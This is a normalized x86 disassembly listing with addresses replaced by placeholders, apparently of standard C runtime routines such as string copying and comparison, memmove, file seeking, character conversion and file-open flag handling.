cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200e11d
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_200b665
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_20016b0
push [ esi + 0x8 ]
call sub_20016b0
push [ esi + 0xc ]
call sub_20016b0
push [ esi + 0x10 ]
call sub_20016b0
push [ esi + 0x14 ]
call sub_20016b0
push [ esi + 0x18 ]
call sub_20016b0
push [ esi ]
call sub_20016b0
push [ esi + 0x20 ]
call sub_20016b0
push [ esi + 0x24 ]
call sub_20016b0
push [ esi + 0x28 ]
call sub_20016b0
push [ esi + 0x2c ]
call sub_20016b0
push [ esi + 0x30 ]
call sub_20016b0
push [ esi + 0x34 ]
call sub_20016b0
push [ esi + 0x1c ]
call sub_20016b0
push [ esi + 0x38 ]
call sub_20016b0
push [ esi + 0x3c ]
call sub_20016b0
add esp 0x40
push [ esi + 0x40 ]
call sub_20016b0
push [ esi + 0x44 ]
call sub_20016b0
push [ esi + 0x48 ]
call sub_20016b0
push [ esi + 0x4c ]
call sub_20016b0
push [ esi + 0x50 ]
call sub_20016b0
push [ esi + 0x54 ]
call sub_20016b0
push [ esi + 0x58 ]
call sub_20016b0
push [ esi + 0x5c ]
call sub_20016b0
push [ esi + 0x60 ]
call sub_20016b0
push [ esi + 0x64 ]
call sub_20016b0
push [ esi + 0x68 ]
call sub_20016b0
push [ esi + 0x6c ]
call sub_20016b0
push [ esi + 0x70 ]
call sub_20016b0
push [ esi + 0x74 ]
call sub_20016b0
push [ esi + 0x78 ]
call sub_20016b0
push [ esi + 0x7c ]
call sub_20016b0
add esp 0x40
push [ esi + 0x80 ]
call sub_20016b0
push [ esi + 0x84 ]
call sub_20016b0
push [ esi + 0x88 ]
call sub_20016b0
push [ esi + 0x8c ]
call sub_20016b0
push [ esi + 0x90 ]
call sub_20016b0
push [ esi + 0x94 ]
call sub_20016b0
push [ esi + 0x98 ]
call sub_20016b0
push [ esi + 0x9c ]
call sub_20016b0
push [ esi + 0xa0 ]
call sub_20016b0
push [ esi + 0xa4 ]
call sub_20016b0
push [ esi + 0xa8 ]
call sub_20016b0
add esp 0x2c
sub_200b7fa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
push esi
call sub_20016b0
pop ecx
sub_200b83f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_20016b0
pop ecx
push esi
call sub_20016b0
pop ecx
sub_200b8d0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_200b916
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_20047ce
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_20047ce
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2004766
add esp 0x14
mov eax esi
jmp r-xdata
sub_200b9cb
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_200ba90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_200bad8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_200d112
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_20047ce
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_20047f4
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_200bb5d
push 0x14
push r--data
call sub_200625c
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
call sub_20047ce
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_20062a1
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_200d189
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_20047e1
mov [ eax ] edi
call sub_20047ce
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200bad8
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200bc6c
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_200bc76
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_200b534
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_200bcbf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_20047ce
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_2004766
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_200bd23
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_20047ce
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_2004766
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_20047ce
mov [ eax ] 0x2a
call sub_20047ce
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_20047ce
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_2007940
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_2007940
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_200beb0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_200bf50
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_200bfd8 ]
jmp [ ecx * 4 + jump_table_200c058 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200c0c4 ]
pop esi
pop edi
pop ebp
jmp sub_200d842
jmp [ ecx * 4 + jump_table_200c260 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_200c164 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200c260 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_200c0c4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_200c260 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200c0c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200c0c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200c0c4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200c260 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200c260 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200c260 ]
sub_200c2b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_2003fef
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_2003ff8
pop ecx
test eax eax
je r-xdata
push eax
call sub_2003ff8
pop ecx
test eax eax
je r-xdata
push eax
call sub_2003ff8
push [ rw-data ]
mov esi eax
call sub_2003ff8
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_2003f7d
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_2003f7d
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_2003f7d
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_2003f7d
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_2003f7d
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_2003ff8
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_200c41e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_200c470
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_200c4a4
push 0x10
push r--data
call sub_200625c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200c53a
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_2002585
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_20016b0
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_200c543
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200463e
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_200e40a
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_20047e1
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_20047ce
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_2004766
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_200d250
